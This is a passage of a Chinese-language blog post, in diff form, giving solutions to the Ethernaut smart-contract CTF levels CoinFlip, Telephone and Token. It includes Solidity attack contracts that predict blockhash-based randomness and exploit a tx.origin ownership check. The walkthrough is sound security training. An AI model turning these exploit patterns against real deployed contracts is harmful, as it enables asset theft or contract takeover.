57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="2-通关要求-2"><a href="#2-通关要求-2" class="headerlink" title="2.通关要求"></a>2.通关要求</h4><ul>
+<li><p>连续猜10次抛硬币的正确结果</p>
+<p>如果猜测错误，计数器就会重置。为了利用该合约，我们必须研究抛硬币时使用的随机性来源。</p>
+</li>
+</ul>
+<h4 id="3-解题步骤-2"><a href="#3-解题步骤-2" class="headerlink" title="3.解题步骤"></a>3.解题步骤</h4><p>只有一个函数 Flip() 接受您的猜测作为布尔值。合约跟踪<code>consecutiveWins</code>状态变量中的连续猜测。<code>consecutiveWins</code>每次正确的猜测都会增加 1，如果您的猜测错误则重置为零。</p>
+<p>分析一下flip()函数</p>
+<p><code>blockhash</code>第一行是使用和的随机性来源<code>block.number</code>。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint256  blockValue  = uint256(blockhash(block.number - 1 ));</span><br></pre></td></tr></table></figure></div>
+
+<p><code>blockValue</code>是使用 计算的<code>block.number-1</code>。可以轻松访问有关该块的信息。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>blockValue</code>除以<code>FACTOR</code>得到<code>coinFlip</code>。如果 的值为<code>coinFlip</code>，<code>1</code>则<code>side</code>将会设置为<code>true</code>；否则，它将被设置为<code>false</code>。<code>FACTOR</code>的值可在合同中找到。由于我们已经拥有所有必需的输入，因此我们可以轻松计算 的值<code>side</code>。我们可以创建一个合约来进行相同的计算并猜测 的值<code>side</code>。</p>
+<p><strong>攻击代码</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">interface ICoinFlip &#123;</span><br><span class="line">    function consecutiveWins() external view returns (uint256);</span><br><span class="line">    function flip(bool) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CoinFlipHack &#123;</span><br><span class="line">    function hack() external &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">        uint256 flip = blockValue / factor;</span><br><span class="line">        bool guess = flip == 1 ? true : false;</span><br><span class="line">        ICoinFlip coinFlip = ICoinFlip(攻击实例代码);</span><br><span class="line">        coinFlip.flip(guess);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>编译通过之后 deploy hack十次 </p>
+<p>![截屏2023-10-05 11.30.03](..&#x2F;..&#x2F;public&#x2F;images&#x2F;截屏2023-10-05 11.30.03.png)</p>
+<h4 id="4-知识点-1"><a href="#4-知识点-1" class="headerlink" title="4.知识点"></a>4.知识点</h4><p>连续猜测</p>
+<h2 id="0x04-Telephone"><a href="#0x04-Telephone" class="headerlink" title="0x04 Telephone"></a>0x04 Telephone</h2><h4 id="1-合约代码-3"><a href="#1-合约代码-3" class="headerlink" title="1.合约代码"></a>1.合约代码</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="2-通关要求-3"><a href="#2-通关要求-3" class="headerlink" title="2.通关要求"></a>2.通关要求</h4><p>获得所有权</p>
+<h4 id="3-解题步骤-3"><a href="#3-解题步骤-3" class="headerlink" title="3.解题步骤"></a>3.解题步骤</h4><p>需要正确区分 tx.origin 和 msg.sender。</p>
+<p>tx.origin 是交易的来源，也就是交易的最初发送者。msg.sender 是消息的直接发送者。考虑这样的调用链： A -&gt; B -&gt; C -&gt; D，D 的 msg.sender 是 C，其 tx.origin 为 A。</p>
+<p>tx.origin 永远不会是合约，而 msg.sender 可能是合约。</p>
+<p>在实际使用中，应该避免使用 tx.origin（1. 之后<a class="link" target="_blank" rel="noopener" href="https://ethereum.stackexchange.com/a/200">很可能被废弃 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>；2. 使用不注意容易引发安全问题）</p>
+<p>回到题目中来，只要 tx.origin 不等于 msg.sender，我们就可以调用 <code>changeOwner</code> 替换 owner，所以写一个简单的中间合约就好：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract HackTelephone &#123;</span><br><span class="line"></span><br><span class="line">    Telephone phone;</span><br><span class="line"></span><br><span class="line">    constructor(Telephone _addr) public &#123;</span><br><span class="line">        phone = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        phone.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>调用 <code>HackTelephone.changeOwner(player)</code> 即可。</p>
+<h4 id="4-知识点-2"><a href="#4-知识点-2" class="headerlink" title="4.知识点"></a>4.知识点</h4><h2 id="0x05-Token"><a href="#0x05-Token" class="headerlink" title="0x05 Token"></a>0x05 Token</h2><h4 id="1-合约代码-4"><a href="#1-合约代码-4" class="headerlink" title="1.合约代码"></a>1.合约代码</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="2-通关要求-4"><a href="#2-通关要求-4" class="headerlink" title="2.通关要求"></a>2.通关要求</h4><p>这一关的目标是攻破下面这个基础 token 合约</p>
+<p>你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好</p>
+<h4 id="3-解题步骤-4"><a href="#3-解题步骤-4" class="headerlink" title="3.解题步骤"></a>3.解题步骤</h4><h4 id="4-知识点-3"><a href="#4-知识点-3" class="headerlink" title="4.知识点"></a>4.知识点</h4>
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> Ethernaut题解</li>
+        <li><strong>作者:</strong> Arie</li>
+        <li><strong>创建于:</strong> 2023-10-05 11:32:04</li>
+        
+            <li>
+                <strong>更新于:</strong> 2023-10-05 11:32:48
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://arieran.github.io/2023/10/05/Ethernaut题解/
+        </li>
+        <li>
+            <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/CTF%E5%88%B7%E9%A2%98/">#CTF刷题</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+  <div class="recommended-article">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header">
+     <i aria-hidden="true"></i><span>推荐阅读</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/2023/07/21/整数溢出学习/" title="整数溢出学习" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="整数溢出学习">
+  <span class="title">整数溢出学习</span>
+</a><a class="recommended-article-item" href="/2023/07/21/Earning-Farm攻击事件分析/" title="Earning.Farm攻击事件分析" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="Earning.Farm攻击事件分析">
+  <span class="title">Earning.Farm攻击事件分析</span>
+</a><a class="recommended-article-item" href="/2023/07/21/hello-world/" title="Hello World" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="Hello World">
+  <span class="title">Hello World</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header">
+     <i aria-hidden="true"></i><span>推荐阅读</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/2023/07/21/整数溢出学习/" title="整数溢出学习" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="整数溢出学习">
+  <span class="title">整数溢出学习</span>
+</a><a class="recommended-article-item" href="/2023/07/21/Earning-Farm攻击事件分析/" title="Earning.Farm攻击事件分析" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="Earning.Farm攻击事件分析">
+  <span class="title">Earning.Farm攻击事件分析</span>
+</a></div>
+   </div>
+  </div>
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/10/04/%E5%8C%97%E5%A4%A7%E8%82%96%E8%87%BB%E5%8C%BA%E5%9D%97%E9%93%BE%E7%AC%94%E8%AE%B0/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">北大肖臻区块链笔记</span>
+                                    <span class="post-nav-item">下一篇</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+                <div class="comment-container">
+                    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;评论
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-pjax>
+        import { init } from 'https://evan.beee.top/js/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://arie-s-comment.vercel.app/',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">Ethernaut题解</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-Hello-Ethernaut"><span class="nav-text">0x00 Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Fallback"><span class="nav-text">0x01 Fallback</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Fallout"><span class="nav-text">0x02 Fallout</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-CoinFlip"><span class="nav-text">0x03 CoinFlip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Telephone"><span class="nav-text">0x04 Telephone</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Token"><span class="nav-text">0x05 Token</span></a></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Arie</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br>
+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.2.2</a>
+        </div>
+        
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
